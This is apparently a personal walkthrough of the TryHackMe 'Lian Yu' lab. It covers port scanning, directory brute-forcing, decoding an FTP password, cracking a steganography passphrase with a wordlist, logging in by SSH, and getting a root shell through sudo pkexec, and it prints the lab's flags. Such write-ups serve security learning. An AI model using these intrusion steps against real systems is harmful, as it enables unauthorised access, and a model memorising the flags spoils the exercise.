## A. Enumeration

### A. 1 Nmap

Nmap found the following info, only short details mentioned here, nmap output file saved in /THM/Liam_Yu

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind 2-4 (RPC #100000)

```

### A.2 HTTP



1. Feroxbuster with small wordlist gave us
```
301        7l       20w      235c http://10.10.251.57/island
301        7l       20w      240c http://10.10.251.57/island/2100

```

found a codeword in source code of /island

```
vigilante
```

2. nothing in the common wordlist

With nothing found i used  a writeup for the hint and understood that the .ticket was an extension

```
─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $feroxbuster -u http://10.10.251.57/island/2100/ -w /usr/share/wordlists/small.txt -n -x ticket
```

We found a new url

```
200        6l       11w       71c http://10.10.251.57/island/2100/green_arrow.ticket
```

here we find a string
```
RTy8yhBQdscX
```

Decoded the above string using the cyberchef URL from base52

```
!#th3h00d
```

as per the questions from THM, this is the ftp password and the code can be used as username

### FTP

username - vigilante
pass - !#th3h00d

I found these files in the ftp data sharing

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
```

Here i checked for stegnography using

steghide, hexedit, magic bytes, binwalk but found nothing so using the writeup again


## B. Shell

found out about another tool we can use in stegnography and made a note of it: stegcracker

```
stegcracker
```


```
┌─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $[[stegcracker]] aa.jpg /usr/share/wordlists/rockyou.txt 

```

```
ttacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 68 passwords
Your file has been written to: aa.jpg.out
password
```

The password was: password

```
─[✗]─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $cat aa.jpg.out
```

this was an unreadable file so i found out the filetype using

```
─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $file aa.jpg.out

aa.jpg.out: Zip archive data, at least v2.0 to extract

```

extracted the file using
```
─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $unzip aa.jpg.out
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado
```

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $cat shado 
M3tahuman
```

maybe this is the password for the other user : slade.

- we get the username by listing the directory on ftp

```
ftp> cd ..
ftp> dir
```
- we find a username `slade` here

It worked, i was able to ssh login into target machine using

username: slade
pass: M3tahuman

easily found the user flag

```
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak
```

## C. Priv Esc

Gaining root shell was also easy,

```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root) 

```

```
# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```